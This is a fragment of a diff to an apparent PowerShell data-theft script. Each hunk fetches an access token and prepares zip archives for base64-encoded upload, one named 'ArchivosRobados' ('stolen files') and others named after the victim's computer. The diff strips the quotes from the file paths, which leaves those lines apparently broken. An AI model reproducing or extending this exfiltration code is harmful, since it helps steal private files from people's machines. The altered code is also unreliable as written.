@@ -170,7 +170,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
+$FileEncrypted = c:\temp\ArchivosRobados-"$ArchivosRobados".zip
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted
@@ -241,7 +241,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted2 = 'c:\temp\backup-"$NomComputadora".zip'
+$FileEncrypted2 = c:\temp\backup-"$NomComputadora".zip
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted2
@@ -312,7 +312,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted3 = 'c:\temp\backup1-"$NomComputadora".zip'
+$FileEncrypted3 = c:\temp\backup1-"$NomComputadora".zip
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted3
